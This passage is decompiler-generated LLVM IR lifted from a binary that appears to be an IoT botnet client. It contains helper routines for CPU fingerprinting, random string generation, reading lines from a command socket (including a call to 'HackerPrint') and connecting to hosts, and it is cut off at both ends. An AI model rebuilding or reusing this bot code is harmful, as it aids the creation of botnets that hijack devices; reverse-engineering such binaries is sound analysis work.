  %v2_94dc = icmp eq i8 %v2_94d8, 0
  br i1 %v2_94dc, label %dec_label_pc_9520, label %dec_label_pc_94e4

dec_label_pc_94e4:                                ; preds = %dec_label_pc_94d4
  %v1_94e8 = add i32 %tmp9, 1
  %v1_94f0 = add i32 %arg2, 1
  %v2_94fc = inttoptr i32 %v1_94e8 to i8*
  %v3_94fc = call i32 @wildString(i8* %v2_94fc, i32 %v1_94f0)
  %v2_9504 = icmp ne i32 %v3_94fc, 0
  %. = zext i1 %v2_9504 to i32
  br label %dec_label_pc_9520

dec_label_pc_9520:                                ; preds = %dec_label_pc_94e4, %dec_label_pc_94d4
  %storemerge3 = phi i32 [ 1, %dec_label_pc_94d4 ], [ %., %dec_label_pc_94e4 ]
  br label %dec_label_pc_95a0

dec_label_pc_952c:                                ; preds = %dec_label_pc_9444
  %v2_9530 = load i8, i8* %arg1, align 1
  %v3_9530 = zext i8 %v2_9530 to i32
  %v1_9538 = call i32 @__GI_toupper(i32 %v3_9530)
  store i32 %v1_9538, i32* @r4, align 4
  %v2_9544 = load i8, i8* %tmp, align 1
  %v3_9544 = zext i8 %v2_9544 to i32
  %v1_954c = call i32 @__GI_toupper(i32 %v3_9544)
  %v0_9554 = load i32, i32* @r4, align 4
  %v9_9554 = icmp eq i32 %v0_9554, %v1_954c
  br i1 %v9_9554, label %dec_label_pc_955c, label %dec_label_pc_9598

dec_label_pc_955c:                                ; preds = %dec_label_pc_952c
  %v1_9560 = add i32 %tmp9, 1
  %v1_9568 = add i32 %arg2, 1
  %v2_9574 = inttoptr i32 %v1_9560 to i8*
  %v3_9574 = call i32 @wildString(i8* %v2_9574, i32 %v1_9568)
  %v2_957c = icmp ne i32 %v3_9574, 0
  %.8 = zext i1 %v2_957c to i32
  br label %dec_label_pc_9598

dec_label_pc_9598:                                ; preds = %dec_label_pc_955c, %dec_label_pc_952c
  %storemerge = phi i32 [ 1, %dec_label_pc_952c ], [ %.8, %dec_label_pc_955c ]
  br label %dec_label_pc_95a0

dec_label_pc_95a0:                                ; preds = %dec_label_pc_9520, %dec_label_pc_94c8, %dec_label_pc_9454, %dec_label_pc_9598
  %stack_var_-48.0 = phi i32 [ %storemerge4, %dec_label_pc_94c8 ], [ %storemerge3, %dec_label_pc_9520 ], [ %v3_9458, %dec_label_pc_9454 ], [ %storemerge, %dec_label_pc_9598 ]
  store i32 %v3_940c, i32* @r4, align 4
  store i32 %v6_940c, i32* @fp, align 4
  ret i32 %stack_var_-48.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_95a0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_94c8, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_95d4 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_95d4, i32* %arg2, align 4
  %v3_95ec = icmp eq i32 %v1_95d4, -1
  %. = zext i1 %v3_95ec to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_962c = load i32, i32* %r0.global-to-local, align 4
  %storemerge1 = inttoptr i32 %v0_962c to i8*
  %v2_96642 = load i8, i8* %storemerge1, align 1
  %v2_96684 = icmp eq i8 %v2_96642, 0
  br i1 %v2_96684, label %dec_label_pc_9670, label %dec_label_pc_9634

dec_label_pc_9634:                                ; preds = %entry, %dec_label_pc_9634
  %storemerge6 = phi i8* [ %storemerge, %dec_label_pc_9634 ], [ %storemerge1, %entry ]
  %storemerge.in5 = phi i32 [ %v1_9658, %dec_label_pc_9634 ], [ %v0_962c, %entry ]
  %v2_9638 = load i8, i8* %storemerge6, align 1
  %v3_9638 = zext i8 %v2_9638 to i32
  store i32 %v3_9638, i32* %r0.global-to-local, align 4
  %v1_9640 = call i32 @__GI_toupper(i32 %v3_9638)
  store i32 %v1_9640, i32* %r0.global-to-local, align 4
  %v1_9650 = trunc i32 %v1_9640 to i8
  store i8 %v1_9650, i8* %storemerge6, align 1
  %v1_9658 = add i32 %storemerge.in5, 1
  %storemerge = inttoptr i32 %v1_9658 to i8*
  %v2_9664 = load i8, i8* %storemerge, align 1
  %v2_9668 = icmp eq i8 %v2_9664, 0
  br i1 %v2_9668, label %dec_label_pc_9660.dec_label_pc_9670_crit_edge, label %dec_label_pc_9634

dec_label_pc_9660.dec_label_pc_9670_crit_edge:    ; preds = %dec_label_pc_9634
  %v1_9678.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9670

dec_label_pc_9670:                                ; preds = %dec_label_pc_9660.dec_label_pc_9670_crit_edge, %entry
  %v1_9678 = phi i32 [ %v1_9678.pre, %dec_label_pc_9660.dec_label_pc_9670_crit_edge ], [ %v0_962c, %entry ]
  ret i32 %v1_9678

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 0 }
  uselistorder i32 %v1_9658, { 1, 0 }
  uselistorder i8* %storemerge6, { 1, 0 }
  uselistorder i32 %v0_962c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_9634, { 1, 0 }
}

define i32 @getBogos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4128 = alloca i32, align 4
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 -4108, i32* @r3, align 4
  %v2_9698 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_9698, i32* @r2, align 4
  %v3_96a8 = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_325d4.54 to i32), i32 0)
  %v2_9860 = ptrtoint i32* %stack_var_-4128 to i32
  %v1_96c8 = bitcast i32* %stack_var_-4128 to i8*
  br label %dec_label_pc_9858

dec_label_pc_96b8:                                ; preds = %dec_label_pc_9858
  %v2_96c8 = call i32 @uppercase(i8* %v1_96c8)
  %v4_96e0 = call i32 @strstr(i32 %v2_9860, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_325e4.56, i32 0, i32 0))
  %v9_96f8 = icmp eq i32 %v4_96e0, %v2_9860
  br i1 %v9_96f8, label %dec_label_pc_9700, label %dec_label_pc_983c

dec_label_pc_9700:                                ; preds = %dec_label_pc_96b8
  %tmp21 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_9724

dec_label_pc_9718:                                ; preds = %dec_label_pc_9744, %dec_label_pc_9734, %dec_label_pc_9724
  %v1_971c = add i32 %v4_9724, 1
  %v5_9720 = inttoptr i32 %v1_971c to i8*
  br label %dec_label_pc_9724

dec_label_pc_9724:                                ; preds = %dec_label_pc_9700, %dec_label_pc_9718
  %storemerge2 = phi i8* [ %v5_9720, %dec_label_pc_9718 ], [ %tmp21, %dec_label_pc_9700 ]
  %v4_9724 = ptrtoint i8* %storemerge2 to i32
  %v2_9728 = load i8, i8* %storemerge2, align 1
  %v7_972c = icmp eq i8 %v2_9728, 32
  br i1 %v7_972c, label %dec_label_pc_9718, label %dec_label_pc_9734

dec_label_pc_9734:                                ; preds = %dec_label_pc_9724
  %v2_9738 = load i8, i8* %storemerge2, align 1
  %v7_973c = icmp eq i8 %v2_9738, 9
  br i1 %v7_973c, label %dec_label_pc_9718, label %dec_label_pc_9744

dec_label_pc_9744:                                ; preds = %dec_label_pc_9734
  %v2_9748 = load i8, i8* %storemerge2, align 1
  %v7_974c = icmp eq i8 %v2_9748, 58
  br i1 %v7_974c, label %dec_label_pc_9718, label %dec_label_pc_977c.preheader

dec_label_pc_977c.preheader:                      ; preds = %dec_label_pc_9744
  %v1_9780 = add i32 %v4_9724, -1
  br label %dec_label_pc_977c

dec_label_pc_9758:                                ; preds = %dec_label_pc_97a4, %dec_label_pc_977c
  %v3_9768 = call i32 @strlen(i8* %storemerge2)
  %v2_9770 = add i32 %v1_9780, %v3_9768
  %v3_9778 = inttoptr i32 %v2_9770 to i8*
  store i8 0, i8* %v3_9778, align 1
  br label %dec_label_pc_977c

dec_label_pc_977c:                                ; preds = %dec_label_pc_977c.preheader, %dec_label_pc_9758
  %v3_978c = call i32 @strlen(i8* %storemerge2)
  %v2_9794 = add i32 %v1_9780, %v3_978c
  %v1_9798 = inttoptr i32 %v2_9794 to i8*
  %v2_9798 = load i8, i8* %v1_9798, align 1
  %v7_979c = icmp eq i8 %v2_9798, 13
  br i1 %v7_979c, label %dec_label_pc_9758, label %dec_label_pc_97a4

dec_label_pc_97a4:                                ; preds = %dec_label_pc_977c
  store i32 %v1_9780, i32* @r4, align 4
  %v3_97b4 = call i32 @strlen(i8* %storemerge2)
  %v0_97bc = load i32, i32* @r4, align 4
  %v2_97bc = add i32 %v0_97bc, %v3_97b4
  %v1_97c0 = inttoptr i32 %v2_97bc to i8*
  %v2_97c0 = load i8, i8* %v1_97c0, align 1
  %v7_97c4 = icmp eq i8 %v2_97c0, 10
  br i1 %v7_97c4, label %dec_label_pc_9758, label %dec_label_pc_97cc

dec_label_pc_97cc:                                ; preds = %dec_label_pc_97a4
  store i32 %v4_9724, i32* @r0, align 4
  %v2_97d8 = call i32 @__GI_strchr(i32 %v4_9724, i32 46)
  %v2_97e0 = icmp eq i32 %v2_97d8, 0
  br i1 %v2_97e0, label %dec_label_pc_9804, label %dec_label_pc_97e8

dec_label_pc_97e8:                                ; preds = %dec_label_pc_97cc
  store i32 %v4_9724, i32* @r0, align 4
  %v2_97f4 = call i32 @__GI_strchr(i32 %v4_9724, i32 46)
  %v3_9800 = inttoptr i32 %v2_97f4 to i8*
  store i8 0, i8* %v3_9800, align 1
  br label %dec_label_pc_9804

dec_label_pc_9804:                                ; preds = %dec_label_pc_97cc, %dec_label_pc_97e8
  store i32 %v4_9724, i32* @r1, align 4
  %v2_9820 = inttoptr i32 %arg1 to i8*
  %v3_9820 = call i32 @strcpy(i8* %v2_9820, i32 %v4_9724)
  %v1_9828 = call i32 @__GI___libc_close(i32 %v3_96a8)
  br label %dec_label_pc_9894

dec_label_pc_983c:                                ; preds = %dec_label_pc_96b8
  %v4_9854 = call i32 @__GI_memset(i8* %v1_96c8, i32 0, i32 4096)
  br label %dec_label_pc_9858

dec_label_pc_9858:                                ; preds = %entry, %dec_label_pc_983c
  %v4_9870 = call i32 @fdgets(i32 %v2_9860, i32 4096, i32 %v3_96a8, i32 %v2_9860)
  %v2_9878 = icmp eq i32 %v4_9870, 0
  br i1 %v2_9878, label %dec_label_pc_9880, label %dec_label_pc_96b8

dec_label_pc_9880:                                ; preds = %dec_label_pc_9858
  %v1_9884 = call i32 @__GI___libc_close(i32 %v3_96a8)
  br label %dec_label_pc_9894

dec_label_pc_9894:                                ; preds = %dec_label_pc_9804, %dec_label_pc_9880
  %storemerge4 = phi i32 [ 1, %dec_label_pc_9880 ], [ 0, %dec_label_pc_9804 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v1_9780, { 2, 1, 0 }
  uselistorder i32 %v4_9724, { 3, 2, 1, 0, 5, 4, 6, 7 }
  uselistorder i8* %storemerge2, { 0, 2, 1, 3, 4, 6, 5 }
  uselistorder i32 %v2_9860, { 0, 3, 1, 2 }
  uselistorder i32 %v3_96a8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9894, { 1, 0 }
  uselistorder label %dec_label_pc_9858, { 1, 0 }
  uselistorder label %dec_label_pc_9804, { 1, 0 }
  uselistorder label %dec_label_pc_977c, { 1, 0 }
  uselistorder label %dec_label_pc_9724, { 1, 0 }
}

define i32 @getCores(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %v2_98c4 = ptrtoint i32* %stack_var_-4120 to i32
  store i32 0, i32* @r3, align 4
  %v3_98d8 = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_325d4.54 to i32), i32 0)
  %v1_98f8 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_9954

dec_label_pc_98e8:                                ; preds = %dec_label_pc_9954
  %v2_98f8 = call i32 @uppercase(i8* %v1_98f8)
  %v4_9910 = call i32 @strstr(i32 %v2_98c4, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_325e4.56, i32 0, i32 0))
  %v9_9924 = icmp eq i32 %v4_9910, %v2_98c4
  br i1 %v9_9924, label %dec_label_pc_992c, label %dec_label_pc_9938

dec_label_pc_992c:                                ; preds = %dec_label_pc_98e8
  %v1_9930 = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_9938

dec_label_pc_9938:                                ; preds = %dec_label_pc_98e8, %dec_label_pc_992c
  %stack_var_-24.0 = phi i32 [ %v1_9930, %dec_label_pc_992c ], [ %stack_var_-24.1, %dec_label_pc_98e8 ]
  %v4_9950 = call i32 @__GI_memset(i8* %v1_98f8, i32 0, i32 4096)
  br label %dec_label_pc_9954

dec_label_pc_9954:                                ; preds = %entry, %dec_label_pc_9938
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0, %dec_label_pc_9938 ]
  %v4_996c = call i32 @fdgets(i32 %v2_98c4, i32 4096, i32 %v3_98d8, i32 %v2_98c4)
  %v2_9974 = icmp eq i32 %v4_996c, 0
  br i1 %v2_9974, label %dec_label_pc_997c, label %dec_label_pc_98e8

dec_label_pc_997c:                                ; preds = %dec_label_pc_9954
  %v1_9980 = call i32 @__GI___libc_close(i32 %v3_98d8)
  ret i32 %stack_var_-24.1

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 0, 2, 1 }
  uselistorder i32 %v2_98c4, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_9954, { 1, 0 }
  uselistorder label %dec_label_pc_9938, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_99a4 = load i32, i32* @r4, align 4
  %v6_99a4 = load i32, i32* @fp, align 4
  %v0_99b0 = load i32, i32* %r0.global-to-local, align 4
  %v5_9a4424 = icmp sgt i32 %arg2, 0
  br i1 %v5_9a4424, label %dec_label_pc_99cc, label %dec_label_pc_9a48

dec_label_pc_99cc:                                ; preds = %entry, %dec_label_pc_99cc
  %storemerge725 = phi i32 [ %v1_9a30, %dec_label_pc_99cc ], [ 0, %entry ]
  %v2_99d8 = add i32 %storemerge725, %v0_99b0
  store i32 %v2_99d8, i32* @r4, align 4
  %v0_99dc = call i32 @rand_cmwc()
  store i32 %v0_99dc, i32* %r0.global-to-local, align 4
  %v3_99ec = udiv i32 %v0_99dc, 26
  %tmp = mul nsw i32 %v3_99ec, -2
  %v2_9a10 = add i32 %v0_99dc, %tmp
  %fold = add i32 %v2_9a10, 65
  %v1_9a28 = trunc i32 %fold to i8
  %v2_9a28 = load i32, i32* @r4, align 4
  %v3_9a28 = inttoptr i32 %v2_9a28 to i8*
  store i8 %v1_9a28, i8* %v3_9a28, align 1
  %v1_9a30 = add nuw nsw i32 %storemerge725, 1
  %v5_9a44 = icmp slt i32 %v1_9a30, %arg2
  br i1 %v5_9a44, label %dec_label_pc_99cc, label %dec_label_pc_9a38.dec_label_pc_9a48_crit_edge

dec_label_pc_9a38.dec_label_pc_9a48_crit_edge:    ; preds = %dec_label_pc_99cc
  %v1_9a50.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9a48

dec_label_pc_9a48:                                ; preds = %dec_label_pc_9a38.dec_label_pc_9a48_crit_edge, %entry
  %v1_9a50 = phi i32 [ %v1_9a50.pre, %dec_label_pc_9a38.dec_label_pc_9a48_crit_edge ], [ %v0_99b0, %entry ]
  store i32 %v3_99a4, i32* @r4, align 4
  store i32 %v6_99a4, i32* @fp, align 4
  ret i32 %v1_9a50

; uselistorder directives
  uselistorder i32 %v1_9a30, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_99cc, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9aac.lr.ph:
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9a5c = load i32, i32* @fp, align 4
  store i32 %v3_9a5c, i32* %stack_var_-16, align 4
  store i32 39524, i32* %stack_var_-4, align 4
  %v2_9a60 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9a60, i32* @fp, align 4
  %v5_9a84 = call i32 @__GI_memset(i8* %arg2, i32 0, i32 %arg3)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_9a98 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9aac

dec_label_pc_9aac:                                ; preds = %dec_label_pc_9aac.lr.ph, %dec_label_pc_9aac
  %storemerge527 = phi i32 [ 0, %dec_label_pc_9aac.lr.ph ], [ %v1_9ac0, %dec_label_pc_9aac ]
  %v5_9ab8 = mul nuw nsw i32 %storemerge527, 4
  %v6_9ab8 = add i32 %v5_9ab8, %v2_9a98
  %v7_9ab8 = inttoptr i32 %v6_9ab8 to i32*
  store i32 0, i32* %v7_9ab8, align 4
  %v1_9ac0 = add nuw nsw i32 %storemerge527, 1
  %tmp52 = icmp ult i32 %v1_9ac0, 32
  br i1 %tmp52, label %dec_label_pc_9aac, label %dec_label_pc_9ad4

dec_label_pc_9ad4:                                ; preds = %dec_label_pc_9aac
  %v13_9a5c = ptrtoint i32* %stack_var_-16 to i32
  %v3_9ad8 = udiv i32 %arg1, 32
  %v3_9ae4 = mul nuw nsw i32 %v3_9ad8, 4
  %v2_9aec = add nsw i32 %v3_9ae4, -160
  %v2_9af0 = add i32 %v2_9aec, %v13_9a5c
  %v1_9af4 = inttoptr i32 %v2_9af0 to i32*
  %v2_9af4 = load i32, i32* %v1_9af4, align 4
  %v1_9afc = urem i32 %arg1, 32
  %v6_9b04 = shl i32 1, %v1_9afc
  %v2_9b08 = or i32 %v2_9af4, %v6_9b04
  store i32 %v2_9b08, i32* %v1_9af4, align 4
  %v1_9b28 = add i32 %arg1, 1
  %v2_9b34 = ptrtoint i32* %stack_var_-184 to i32
  %v5_9b48 = call i32 @__libc_select(i32 %v1_9b28, i32 %v2_9a98, i32 0, i32 %v2_9a98, i32 %v2_9b34)
  %v5_9b5c = icmp sgt i32 %v5_9b48, 0
  br i1 %v5_9b5c, label %dec_label_pc_9cf0.preheader, label %dec_label_pc_9c5c.preheader

dec_label_pc_9c5c.preheader:                      ; preds = %dec_label_pc_9ad4
  %v7_9c6423 = icmp slt i32 %tmp33, 10
  br i1 %v7_9c6423, label %dec_label_pc_9b9c.lr.ph, label %dec_label_pc_9cf0.preheader

dec_label_pc_9b9c.lr.ph:                          ; preds = %dec_label_pc_9c5c.preheader, %dec_label_pc_9c50
  %stack_var_-44.024 = phi i32 [ %v1_9c54, %dec_label_pc_9c50 ], [ %tmp33, %dec_label_pc_9c5c.preheader ]
  %v2_9b68 = load i32, i32* @global_var_42c60.61, align 4
  %v3_9b74 = call i32 @HackerPrint(i32 %v2_9b68, i32 ptrtoint ([5 x i8]* @global_var_325f0.63 to i32))
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_9b9c

dec_label_pc_9b9c:                                ; preds = %dec_label_pc_9b9c.lr.ph, %dec_label_pc_9b9c
  %storemerge615 = phi i32 [ 0, %dec_label_pc_9b9c.lr.ph ], [ %v1_9bb0, %dec_label_pc_9b9c ]
  %v5_9ba8 = mul nuw nsw i32 %storemerge615, 4
  %v6_9ba8 = add i32 %v5_9ba8, %v2_9a98
  %v7_9ba8 = inttoptr i32 %v6_9ba8 to i32*
  store i32 0, i32* %v7_9ba8, align 4
  %v1_9bb0 = add nuw nsw i32 %storemerge615, 1
  %tmp53 = icmp ult i32 %v1_9bb0, 32
  br i1 %tmp53, label %dec_label_pc_9b9c, label %dec_label_pc_9bc4

dec_label_pc_9bc4:                                ; preds = %dec_label_pc_9b9c
  %v2_9be4 = load i32, i32* %v1_9af4, align 4
  %v2_9bf8 = or i32 %v2_9be4, %v6_9b04
  store i32 %v2_9bf8, i32* %v1_9af4, align 4
  %v5_9c38 = call i32 @__libc_select(i32 %v1_9b28, i32 %v2_9a98, i32 0, i32 %v2_9a98, i32 %v2_9b34)
  %v5_9c4c = icmp sgt i32 %v5_9c38, 0
  br i1 %v5_9c4c, label %dec_label_pc_9cf0.preheader, label %dec_label_pc_9c50

dec_label_pc_9c50:                                ; preds = %dec_label_pc_9bc4
  %v1_9c54 = add nsw i32 %stack_var_-44.024, 1
  %v7_9c64 = icmp slt i32 %v1_9c54, 10
  br i1 %v7_9c64, label %dec_label_pc_9b9c.lr.ph, label %dec_label_pc_9cf0.preheader

dec_label_pc_9cf0.preheader:                      ; preds = %dec_label_pc_9c50, %dec_label_pc_9bc4, %dec_label_pc_9c5c.preheader, %dec_label_pc_9ad4
  %v2_9c84 = ptrtoint i8* %stack_var_-185 to i32
  %not.v7_9cf857 = icmp sgt i32 %arg3, 1
  %v2_9d1059 = icmp eq i1 %not.v7_9cf857, false
  br i1 %v2_9d1059, label %dec_label_pc_9d18, label %dec_label_pc_9c7c

dec_label_pc_9c7c:                                ; preds = %dec_label_pc_9cf0.preheader, %dec_label_pc_9ce4
  %v1_9cf462.in = phi i32 [ %v1_9cf462, %dec_label_pc_9ce4 ], [ %arg3, %dec_label_pc_9cf0.preheader ]
  %stack_var_-40.061 = phi i8* [ %v5_9cd4, %dec_label_pc_9ce4 ], [ %arg2, %dec_label_pc_9cf0.preheader ]
  %stack_var_-36.060 = phi i32 [ %v1_9ce8, %dec_label_pc_9ce4 ], [ 0, %dec_label_pc_9cf0.preheader ]
  %v1_9cf462 = add i32 %v1_9cf462.in, -1
  %v2_9c80 = load i32, i32* @global_var_42c60.61, align 4
  %v5_9c98 = call i32 @__libc_recv(i32 %v2_9c80, i32 %v2_9c84, i32 1, i32 0, i32 %v1_9cf462)
  %v7_9ca0 = icmp eq i32 %v5_9c98, 1
  br i1 %v7_9ca0, label %dec_label_pc_9cc0, label %dec_label_pc_9ca8

dec_label_pc_9ca8:                                ; preds = %dec_label_pc_9c7c
  store i8 0, i8* %stack_var_-40.061, align 1
  br label %dec_label_pc_9d3c

dec_label_pc_9cc0:                                ; preds = %dec_label_pc_9c7c
  %v3_9cc0 = load i8, i8* %stack_var_-185, align 1
  %v4_9cc4 = ptrtoint i8* %stack_var_-40.061 to i32
  store i8 %v3_9cc0, i8* %stack_var_-40.061, align 1
  %v1_9cd0 = add i32 %v4_9cc4, 1
  %v5_9cd4 = inttoptr i32 %v1_9cd0 to i8*
  %v3_9cd8 = load i8, i8* %stack_var_-185, align 1
  %v7_9cdc = icmp eq i8 %v3_9cd8, 10
  br i1 %v7_9cdc, label %dec_label_pc_9d18, label %dec_label_pc_9ce4

dec_label_pc_9ce4:                                ; preds = %dec_label_pc_9cc0
  %v1_9ce8 = add i32 %stack_var_-36.060, 1
  %not.v7_9cf8 = icmp sgt i32 %v1_9cf462, 1
  %v2_9d10 = icmp eq i1 %not.v7_9cf8, false
  br i1 %v2_9d10, label %dec_label_pc_9d18, label %dec_label_pc_9c7c

dec_label_pc_9d18:                                ; preds = %dec_label_pc_9cc0, %dec_label_pc_9ce4, %dec_label_pc_9cf0.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_9cf0.preheader ], [ %v1_9ce8, %dec_label_pc_9ce4 ], [ %stack_var_-36.060, %dec_label_pc_9cc0 ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_9cf0.preheader ], [ %v5_9cd4, %dec_label_pc_9ce4 ], [ %v5_9cd4, %dec_label_pc_9cc0 ]
  %v4_9d18 = ptrtoint i8* %stack_var_-40.1 to i32
  store i8 0, i8* %stack_var_-40.1, align 1
  %v6_9d30 = call i32 @zprintf(i32 ptrtoint ([10 x i8]* @global_var_325f8.65 to i32), i32 %v4_9d18, i32 %v4_9d18)
  br label %dec_label_pc_9d3c

dec_label_pc_9d3c:                                ; preds = %dec_label_pc_9ca8, %dec_label_pc_9d18
  %storemerge = phi i32 [ -1, %dec_label_pc_9ca8 ], [ %stack_var_-36.0.lcssa, %dec_label_pc_9d18 ]
  %v2_9d48 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_9d48, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-40.1, { 1, 0 }
  uselistorder i32 %v1_9cf462, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.061, { 1, 2, 0 }
  uselistorder i32 %v1_9c54, { 1, 0 }
  uselistorder i32 %storemerge615, { 1, 0 }
  uselistorder i32 %storemerge527, { 1, 0 }
  uselistorder i32 %v2_9a98, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @zprintf, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9d3c, { 1, 0 }
  uselistorder label %dec_label_pc_9d18, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9c7c, { 1, 0 }
  uselistorder label %dec_label_pc_9b9c, { 1, 0 }
  uselistorder label %dec_label_pc_9b9c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_9aac, { 1, 0 }
}

define i32 @hostname_to_ip(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 40296, i32* %stack_var_-4, align 4
  %v2_9d64 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9d64, i32* @fp, align 4
  store i32 %arg1, i32* @r0, align 4
  %v1_9d78 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_9d88 = icmp eq i32 %v1_9d78, 0
  br i1 %v2_9d88, label %dec_label_pc_9d90, label %dec_label_pc_9da4

dec_label_pc_9d90:                                ; preds = %entry
  %v3_9d94 = call i32 @__GI_herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_32604.67, i32 0, i32 0))
  br label %dec_label_pc_9e1c

dec_label_pc_9da4:                                ; preds = %entry
  %v1_9da8 = add i32 %v1_9d78, 16
  %v2_9da8 = inttoptr i32 %v1_9da8 to i32*
  %v3_9da8 = load i32, i32* %v2_9da8, align 4
  %v1_9dcc = inttoptr i32 %v3_9da8 to i32*
  %v2_9dcc = load i32, i32* %v1_9dcc, align 4
  %v2_9dd0 = icmp eq i32 %v2_9dcc, 0
  br i1 %v2_9dd0, label %dec_label_pc_9e14, label %dec_label_pc_9dd8

dec_label_pc_9dd8:                                ; preds = %dec_label_pc_9da4
  %v2_9dec = load i32, i32* %v1_9dcc, align 4
  %v1_9df0 = inttoptr i32 %v2_9dec to i32*
  %v2_9df0 = load i32, i32* %v1_9df0, align 4
  store i32 %v2_9df0, i32* @r0, align 4
  %v1_9df4 = call i32 @__GI_inet_ntoa(i32 %v2_9df0)
  store i32 %v1_9df4, i32* @r1, align 4
  %v2_9e04 = inttoptr i32 %arg2 to i8*
  %v3_9e04 = call i32 @strcpy(i8* %v2_9e04, i32 %v1_9df4)
  br label %dec_label_pc_9e1c

dec_label_pc_9e14:                                ; preds = %dec_label_pc_9da4
  br label %dec_label_pc_9e1c

dec_label_pc_9e1c:                                ; preds = %dec_label_pc_9dd8, %dec_label_pc_9d90, %dec_label_pc_9e14
  %stack_var_-44.0 = phi i32 [ 1, %dec_label_pc_9d90 ], [ 1, %dec_label_pc_9e14 ], [ 0, %dec_label_pc_9dd8 ]
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9e1c, { 2, 0, 1 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg4, i32* @r3, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9e38 = load i32, i32* @fp, align 4
  store i32 %v3_9e38, i32* %stack_var_-16, align 4
  %v13_9e38 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r2, align 4
  %v2_9e60 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_9e70 = or i32 %v2_9e60, 2048
  store i32 %v1_9e70, i32* @r3, align 4
  store i32 %v1_9e70, i32* @r2, align 4
  %v2_9e84 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_9e98 = urem i32 %arg3, 65536
  %v1_9ea0 = call i32 @__GI_htons(i32 %v3_9e98)
  %v3_9ec0 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
